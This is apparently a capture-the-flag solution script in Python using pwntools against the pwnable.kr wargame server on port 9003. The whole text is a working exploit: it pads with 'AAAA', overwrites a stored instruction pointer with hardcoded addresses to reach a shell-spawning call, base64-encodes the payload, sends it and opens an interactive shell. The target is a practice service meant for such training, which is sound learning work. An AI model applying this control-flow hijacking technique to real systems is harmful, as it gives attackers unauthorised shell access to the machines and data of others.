from base64 import b64encode
from pwn import *

SYSTEM_BINSH = p32(0x08049284)
STORED_EIP = p32(0x0811EB40)
PAYLOAD = "AAAA" + SYSTEM_BINSH + STORED_EIP

conn = remote("pwnable.kr", 9003)
conn.sendline(b64encode(PAYLOAD))
conn.interactive()
